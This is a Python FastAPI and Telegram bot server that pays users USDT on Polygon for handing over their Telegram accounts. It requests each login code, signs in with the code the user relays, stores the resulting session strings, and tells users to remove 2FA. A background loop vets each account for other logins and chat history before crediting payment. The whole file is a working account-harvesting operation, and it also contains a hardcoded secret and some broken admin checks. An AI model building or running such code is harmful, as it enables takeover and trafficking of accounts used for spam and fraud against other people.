import os
import sys
import uvicorn
import hmac
import hashlib
import json
import time
import uuid
import asyncio
import telebot
import threading
from web3 import Web3
from dotenv import load_dotenv
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from starlette.middleware.sessions import SessionMiddleware
from fastapi.middleware.cors import CORSMiddleware
from urllib.parse import parse_qsl
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (SessionPasswordNeededError,
PhoneNumberInvalidError,
PhoneCodeInvalidError,
PhoneCodeExpiredError,
FloodWaitError,
PhoneNumberBannedError)
from cryptography.fernet import Fernet
load_dotenv()

rpc_url = "https://polygon-rpc.com"
w3 = Web3(Web3.HTTPProvider(rpc_url))


api_hash = os.getenv("API_HASH")
api_id = os.getenv("API_ID")
bot_token = os.getenv("BOT_TOKEN")
fernet_key = os.getenv("FERNET_KEY")
mongo_uri = os.getenv("MONGO_DB_URI")
if not fernet_key:
    sys.exit("❌ FERNET_KEY not found in .env file")
cipher = Fernet(fernet_key.encode())
req_ids = {}

async def cleanup_req_id(req_id, timeout=120):
    await asyncio.sleep(timeout)
    req_ids.pop(req_id, None)

def start_bot():
    bot.infinity_polling()


@asynccontextmanager
async def lifespan(app: FastAPI):
    mongo_client = MongoClient(mongo_uri, serverSelectionTimeoutMS=5000)
    try:
        mongo_client.admin.command("ping")
        print("🛜 Pinged your deployment. You successfully connected to MongoDB!")
    except Exception as e:
        print("🚨 Error connecting to MongoDB")
        sys.exit(1)
    app.state.db = mongo_client["telegram_app"]
    app.state.users = app.state.db["users"]
    app.state.sessions = app.state.db["sessions"]
    print("✅ Database connected")
    print("✅ Accounts checker started")
    print("✅ Server started")
    print(f"✅ Connected to Polygon RPC: {w3.is_connected()}")
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    print("✅ Telegram bot started")
    task = asyncio.create_task(check_accounts())
    yield
    mongo_client.close()
    print("✅ MongoDB disconnected")
    task.cancel()
    
    print("✅ Server stopped")

app = FastAPI(lifespan=lifespan)
app.add_middleware(
    SessionMiddleware,
    secret_key="h8#3737376@&#!736iehd",
    same_site="lax",
    https_only=True,
    session_cookie="session",
    max_age=60 * 60
)
app.mount("/public", StaticFiles(directory="public"), name="static")
origins = [
    "http://127.0.0.1:5502",
]
app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

bot = telebot.TeleBot(bot_token)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hello! Welcome to the bot.")


@bot.message_handler(commands=['createAdmin'])
def create_admin(message):
    if not hasattr(app.state, "users"):
        return bot.reply_to(message, "Bot initializing, try again")
    admin = app.state.users.find_one({"userId": "bot"})
    if admin:
        return bot.reply_to(message, "Admin already exists!")
    adminId = os.getenv("ADMIN_ID")
    if not adminId:
        return bot.reply_to(message, "Admin ID not found in .env file")
    if adminId != str(message.from_user.id):
        return bot.reply_to(message, "You are not authorized to use this command!")
    admin = {
        "userId": "bot",
        "adminId": adminId,
        "referIds": [],
        "limits": []
    }
    app.state.users.insert_one(admin)
    bot.reply_to(message, "Admin created successfully!")



@bot.message_handler(commands=['refer'])
def send_refer(message):
    if not hasattr(app.state, "users"):
        return bot.reply_to(message, "Bot initializing, try again")
        
    part = message.text.split(" ")
    referId = part[1] if len(part) > 1 else None
    
    if not referId:
        return bot.reply_to(message, "Please provide a referId to add!")
        
    admin = app.state.users.find_one({"userId": "bot"})
    if not admin:
        return bot.reply_to(message, "Admin not found! use /createAdmin to create admin")

    if admin["adminId"] != str(message.from_user.id):
        return bot.reply_to(message, "You are not authorized to use this command!")
    
    if referId in [refer["referId"] for refer in admin["referIds"]]:
        return bot.reply_to(message, "ReferId already exists!")
        
    app.state.users.update_one({"userId": "bot"}, {"$push": {"referIds": {
        "referId": str(referId),
        "createdAt": time.time(),
        "joinedUsersCount": 0,
        "joinedUsers": []
    }}})
    bot_info = bot.get_me()
    bot.reply_to(message, f"ReferId added successfully! {referId}, https://t.me/{bot_info.username}?startapp={referId}")
    
@bot.message_handler(commands=['getRefer'])
def get_refer(message):
    if not hasattr(app.state, "users"):
        return bot.reply_to(message, "Bot initializing, try again")
    admin = app.state.users.find_one({"userId": "bot"})
    if not admin:
        return bot.reply_to(message, "Admin not found! use /createAdmin to create admin")
    if admin["adminId"] != str(message.from_user.id):
        return bot.reply_to(message, "You are not authorized to use this command!")
    referIds = admin["referIds"]
    if not referIds:
        return bot.reply_to(message, "No referIds found!")
    referIds =  "\n".join([f"{refer['referId']} - {refer['joinedUsersCount']} users" for refer in referIds])
    bot.reply_to(message, f"ReferIds:\n\n{referIds}")

@bot.message_handler(commands=['setLimit'])
def set_limit(message):
    if not hasattr(app.state, "users"):
        return bot.reply_to(message, "Bot initializing, try again")
    part = message.text.split(" ")
    if len(part) < 4:
        return bot.reply_to(message, "Please provide a phone prefix, limit and price to set!")
    prefix = part[1]
    limit = part[2]
    price = part[3]
    if not prefix or not limit or not price:
        return bot.reply_to(message, "Please provide a phone prefix, limit and price to set! /setLimit <prefix> <limit> <price>")
    if not prefix.isdigit() or not limit.isdigit():
        return bot.reply_to(message, "Please provide a valid phone prefix and limit to set!")
    try:
        price = float(price)
    except:
        return bot.reply_to(message, "Please provide a valid price to set!")
    admin = app.state.users.find_one({"userId": "bot"})
    if not admin:
        return bot.reply_to(message, "Admin not found! use /createAdmin to create admin")
    if admin["adminId"] == str(message.from_user.id):
        return bot.reply_to(message, "You are not authorized to use this command!")
    limits = admin.get("limits", {})
    limits[prefix] = {
        "max": int(limit),
        "count": 0,
        "price": price
    }
    app.state.users.update_one({"userId": "bot"}, {"$set": {"limits": limits}})
    bot.reply_to(message, f"Limit set successfully! {prefix} - {limit} - {price}")

@bot.message_handler(commands=['getLimit'])
def get_limit(message):
    if not hasattr(app.state, "users"):
        return bot.reply_to(message, "Bot initializing, try again")
    admin = app.state.users.find_one({"userId": "bot"})
    if not admin:
        return bot.reply_to(message, "Admin not found! use /createAdmin to create admin")
    if admin["adminId"] == str(message.from_user.id):
        return bot.reply_to(message, "You are not authorized to use this command!")
    limits = admin.get("limits", {})
    if not limits:
        return bot.reply_to(message, "No limits found!")
    limits = "\n".join([f"{prefix} - {limit['count']}/{limit['max']} ({limit['price']})" for prefix, limit in limits.items()])
    bot.reply_to(message, f"Limits:\n\n{limits}")

def verify_telegram(init_data):
    data = dict(parse_qsl(init_data))
    hash_received = data.pop("hash", None)
    if not hash_received:
        return False
    check_string = "\n".join(f"{k}={v}" for k, v in sorted(data.items()))
    secret_key = hmac.new(
        b"WebAppData",
        bot_token.encode(),
        hashlib.sha256
    ).digest()
    hash_calc = hmac.new(
        secret_key,
        check_string.encode(),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(hash_calc, hash_received)

@app.get("/")
async def index():
    return FileResponse("public/index.html")

@app.post("/me")
async def me(request: Request):
    body = await request.json()
    initData = body.get("initData")

    if not initData:
        print("No initData provided")
        return JSONResponse({"error": "No initData provided"})

    if not verify_telegram(initData):
        print("Invalid initData")
        return JSONResponse({"error": "Invalid initData"})
    try:
        user_data = dict(parse_qsl(initData))
        upline = user_data.get("start_param", None)
        user_json = json.loads(user_data.get("user", "{}"))
        userId = int(user_json.get("id"))
        request.session["userId"] = userId
        #app.state.users.delete_one({"userId": userId})
        user = app.state.users.find_one({"userId": userId}, {"_id": 0})
        if not user:
            if not upline:
                return JSONResponse({"error": "No upline"})
            admin = app.state.users.find_one({"userId": "bot"})
            if not admin:
                return JSONResponse({"error": "Bot is not ready yet. If you are the admin, please use /createAdmin to create admin"})
            if upline not in [refer["referId"] for refer in admin["referIds"]]:
                return JSONResponse({"error": "Invalid upline"})
            user = {
                "userId": userId,
                "balance": 0,
                "upline": upline,
                "accounts": []
            }
            app.state.users.insert_one(user)
            user.pop("_id", None)
            app.state.users.update_one({"userId": "bot", "referIds.referId": upline}, {"$inc": {"referIds.$.joinedUsersCount": 1}, "$push": {"referIds.$.joinedUsers": userId}})
            bot.send_message(admin["adminId"], f"New user joined with upline: {upline}")
        return JSONResponse({
            "success": True,
            "user": user
        })
    except Exception as e:
        print("Error:", e)
        return JSONResponse({"error": "Internal server error"})
    


@app.post("/withdraw")
async def withdraw(request: Request):
    body = await request.json()
    userId = request.session.get("userId")
    if not userId:
        return JSONResponse({
            "success": False,
            "error": "Invalid session... Please refresh the page!"
        })
    amount = body.get("amount")
    address = body.get("address")
    if not address or address == "" or len(address) < 30 or not w3.is_address(address):
        return JSONResponse({
            "success": False,
            "error": "Invalid withdrawal address"
        })
    if not amount or amount == "":
        return JSONResponse({
            "success": False,
            "error": "Invalid withdrawal amount"
        })
    try:
        amount = float(amount)
    except:
        return JSONResponse({
            "success": False,
            "error": "Invalid withdrawal amount"
        })
    if amount < 10:
        return JSONResponse({
            "success": False,
            "error": "Minimum withdrawal amount is 10 USDT"
        })
    user = app.state.users.find_one({"userId": int(userId)})
    if not user:
        return JSONResponse({
            "success": False,
            "error": "User not found"
        })
    if user["balance"] < amount:
        return JSONResponse({
            "success": False,
            "error": "Insufficient balance"
        })
    try:
        private_key = os.getenv("POL_PRIVATE_KEY")
        account = w3.eth.account.from_key(private_key)
        from_address = account.address
        USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
        ERC20_ABI = [
        {
            "constant": False,
            "inputs": [
                {"name": "_to", "type": "address"},
                {"name": "_value", "type": "uint256"}
            ],
            "name": "transfer",
            "outputs": [{"name": "", "type": "bool"}],
            "type": "function"
        }
        ]
        usdt_contract = w3.eth.contract(address=USDT_ADDRESS, abi=ERC20_ABI)
        nonce = w3.eth.get_transaction_count(from_address)
        txn = usdt_contract.functions.transfer(address, int(amount * 10**6)).build_transaction({
        'chainId': 137,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
        })
        signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
        print(tx_hash)
    
        app.state.users.update_one({"userId": int(userId)}, {"$inc": {"balance": -amount}})

        return JSONResponse({
        "success": True,
        })
    except Exception as e:
        return JSONResponse({
             "success": False,
             "error": "🥲 Internal server error"
        })


@app.get("/get-code")
async def get_code(request: Request):
    userId = request.session.get("userId")
    if not userId:
        return JSONResponse({
            "success": False,
            "error": "Invalid session... Please refresh the page!"
        })
    phone_number = request.query_params.get("phone")
    if not phone_number or phone_number == "" or len(phone_number) < 11 or len(phone_number) > 15 or not phone_number.isdigit():
        return JSONResponse({
            "success": False,
            "error": "Invalid phone number"
        })

    admin = app.state.users.find_one({"userId": "bot"})
    if not admin:
        return JSONResponse({
            "success": False,
            "error": "Bot is not ready yet. If you are the admin, please use /createAdmin to create admin"
        })
    limits = admin.get("limits",{})
    matching_prefix = None
    for prefix in limits:
        if phone_number.startswith(prefix):
            matching_prefix = prefix
            break
    print(matching_prefix)
    if not matching_prefix:
        return JSONResponse({
            "success": False,
            "error": "Country phone number not supported"
        })
    details = limits[matching_prefix]
    if details["count"] >= details["max"]:
        return JSONResponse({
            "success": False,
            "error": "Capacity is completed 🙌🏻!"
        })

    if app.state.users.find_one({"userId": int(userId), "accounts.contact": str(phone_number)}):
        return JSONResponse({
            "success": False,
            "error": "Phone number already exists"
        })
    try:
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        result = await client.send_code_request(phone_number)
        req_id = str(uuid.uuid4())
        req_ids[req_id] = {
             "phone_number": phone_number,
            "phone_code_hash": result.phone_code_hash,
            "client": client
        }
        asyncio.create_task(cleanup_req_id(req_id))
        return JSONResponse({
            "success": True,
            "req_id": req_id
        })
    except PhoneNumberInvalidError:
        await client.disconnect()
        return JSONResponse({"success": False, "error": "The phone number is invalid or not registered."})
    except SessionPasswordNeededError:
        await client.disconnect()
        return JSONResponse({"success": False, "error": "Two-step verification enabled. You need to remove your 2FA password."})
    except FloodWaitError:
        await client.disconnect()
        return JSONResponse({"success": False, "error": "Too many requests."})
    except PhoneNumberBannedError:
        await client.disconnect()
        return JSONResponse({"success": False, "error": "The phone number is banned."})
    except Exception:
        if 'client' in locals():
            await client.disconnect()
        return JSONResponse({"success": False, "error": "Some other error occurred."})



@app.post("/verify-code")
async def verify_code(request: Request):
    userId = request.session.get("userId")
    if not userId:
        return JSONResponse({
            "success": False,
            "error": "Invalid session... Please refresh the page!"
        })
    body = await request.json()
    req_id = body.get("req_id")
    code_input = body.get("code")
    if not req_id or not code_input:
        return JSONResponse({
            "success": False,
            "error": "Invalid request"
        })
    if len(code_input) != 5 or not code_input.isdigit():
        return JSONResponse({
            "success": False,
            "error": "Invalid code"
        })
    d = req_ids.get(req_id)
    if not d:
        return JSONResponse({
            "success": False,
            "error": "Invalid request ID"
        })
    phone_number = d.get("phone_number")
    phone_code_hash = d.get("phone_code_hash")
    client = d.get("client")
    if not phone_number or not phone_code_hash:
        return JSONResponse({
            "success": False,
            "error": "Invalid request ID(s)"
        })
    err = None
    try:
        await client.sign_in(phone_number, code=code_input, phone_code_hash=phone_code_hash)
        encrypted_session_string = cipher.encrypt(client.session.save().encode())
        await client.disconnect()
        req_ids.pop(req_id)
        up = {
            "id": str(uuid.uuid4()),
            "contact": str(phone_number),
            "amount": 0,
            "timeStamp": time.time(),
            "accountStatus": "pending",
            "isCompleted": "pending",
        }
        app.state.sessions.insert_one({
            "session": encrypted_session_string,
            "userId": int(userId),
            "contact": str(phone_number),
            "checked": False,
            "timeStamp": time.time()
        })
        app.state.users.update_one({"userId": int(userId)}, {"$push": {"accounts": up}})
        up.pop("_id", None)
        return JSONResponse({
            "success": True,
            "account": up
        })
    except PhoneCodeInvalidError:
        err = "Incorrect login code. Please try again."
    except PhoneCodeExpiredError:
        err = "The code has expired. Please request a new one."
    except SessionPasswordNeededError:
        err = "Two-step verification enabled. You need to remove your 2FA password."
    except FloodWaitError:
        err = f"Too many requests. Wait for {e.seconds} seconds."
    except PhoneNumberBannedError:
        err = "The phone number is banned."
    except Exception as e:
        err = "Some other error occurred."
    finally:
        if err:
            return JSONResponse({
                "success": False,
                "error": err
            })



async def check_accounts():
    while True:
        #return
        print("🦾 Checking accounts...")

        count = app.state.sessions.count_documents({"checked": False})
        if count == 0:
            print("😣 No accounts to check!")
            await asyncio.sleep(60)
            continue

        print("🔥 Accounts to check:", count)
        limits = app.state.users.find_one({"userId": "bot"}).get("limits", {})
        cursor = app.state.sessions.find({"checked": False})

        for doc in cursor:
            session = doc.get("session")
            userId = doc.get("userId")
            contact = doc.get("contact")

            if not session or not userId or not contact:
                print(f"🚨 Invalid session data for {contact}")
                continue

            try:
                session_string = cipher.decrypt(session).decode()
                client = TelegramClient(
                    StringSession(session_string),
                    api_id,
                    api_hash
                )

                await client.connect()

                if not await client.is_user_authorized():
                    print(f"🚨 Session not authorized: {contact}")
                    app.state.users.update_one(
                        {"userId": int(userId), "accounts.contact": str(contact)},
                        {"$set": {
                            "accounts.$.accountStatus": "Limited",
                            "accounts.$.accountStatusText": "Session expired or logged out",
                            "accounts.$.isCompleted": "rejected"
                        }}
                    )
                    app.state.sessions.update_one(
                        {"_id": doc["_id"]},
                        {"$set": {"checked": True}}
                    )
                    await client.disconnect()
                    continue

                me = await client.get_me()
                dialogs = await client.get_dialogs(limit=6)
                allLogins = await client(functions.account.GetAuthorizationsRequest())
                await client.disconnect()

                logins = len(allLogins.authorizations)

                status_reasons = []

                if me.deleted:
                    status_reasons.append("Account is deleted")
                if me.restricted:
                    status_reasons.append("Account is restricted by Telegram")
                if me.bot:
                    status_reasons.append("Account is a bot account")
                if me.scam:
                    status_reasons.append("Account is marked as scam")
                if me.fake:
                    status_reasons.append("Account is marked as fake")

                if logins > 1:
                    status_reasons.append(f"Multiple active logins detected ({logins})")

                if len(dialogs) > 5:
                    status_reasons.append(f"Account has too many dialogs more than (5)")

                if status_reasons:
                    accountStatus = "Limited"
                    accountStatusText = " | ".join(status_reasons)
                    print(f"🚨 Account limited: {contact} → {accountStatusText}")
                else:
                    price = 0
                    for prefix in limits:
                        if contact.startswith(prefix):
                            price = limits[prefix]["price"]
                    accountStatus = "free"
                    accountStatusText = "Account is free and not limited"
                    print(f"🔥 Account free: {contact}")
                app.state.users.update_one(
                    {"userId": int(userId), "accounts.contact": str(contact)},
                    {"$set": {
                        "accounts.$.amount": price if accountStatus == "free" else 0,
                        "accounts.$.accountStatus": accountStatus,
                        "accounts.$.accountStatusText": accountStatusText,
                        "accounts.$.isCompleted": "accepted" if accountStatus == "free" else "rejected"
                    }}
                )

                
                app.state.sessions.update_one(
                    {"_id": doc["_id"]},
                    {"$set": {"checked": True}}
                )
                if accountStatus == "free":
                    app.state.users.update_one(
                        {"userId": int(userId)},{ "$inc": {"balance": price}})
            except Exception as e:
                print(f"🚨 Error logging session for {contact}: {type(e).__name__} -> {e}")

        await asyncio.sleep(30)

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000)